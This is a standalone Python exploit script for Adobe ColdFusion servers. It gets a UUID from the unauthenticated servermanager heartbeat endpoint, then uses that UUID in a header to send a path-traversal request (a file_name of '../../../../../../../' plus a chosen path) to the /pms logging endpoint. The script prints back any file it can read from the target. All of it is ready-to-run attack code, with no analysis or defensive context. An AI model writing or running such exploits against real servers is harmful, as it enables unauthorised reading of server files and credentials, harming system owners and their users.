import requests
import re
import urllib3
import argparse

urllib3.disable_warnings()

parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target",required=True, help="Target Adobe ColdFusion Server URL")
parser.add_argument("-p", "--port",required=False, default=8500, help="Target Adobe ColdFusion Server Port, by default we use the 8500 Port")
parser.add_argument("-c", "--command", required=True,help="File to read path") # Example in Windows Server 'Windows/ServerStandardEval.xml'
args = parser.parse_args()

def get_uuid():
    endpoint = "/CFIDE/adminapi/_servermanager/servermanager.cfc?method=getHeartBeat" # Vulnerable endpoint to get the UUID
    session = requests.Session()
    response = session.get("http://"+args.target+":"+str(args.port)+endpoint, verify=False)
    repattern = r"<var name='uuid'><string>(.+?)</string></var>"
    uuid = re.findall(repattern, response.text)[0]
    print("[+] UUID Obtained: ", uuid)
    return uuid

def exploit(uuid):
    headers = {
        "uuid": uuid
    }
    session = requests.Session()
    endpoint2 = "/pms?module=logging&file_name=../../../../../../../"+args.command+"&number_of_lines=100" # Vulnerable endpoint to read files
    response = session.get("http://"+args.target+":"+str(args.port)+endpoint2, verify=False, headers=headers)

    print("[+] Succesfully read file!")
    print(response.text)

exploit(get_uuid())
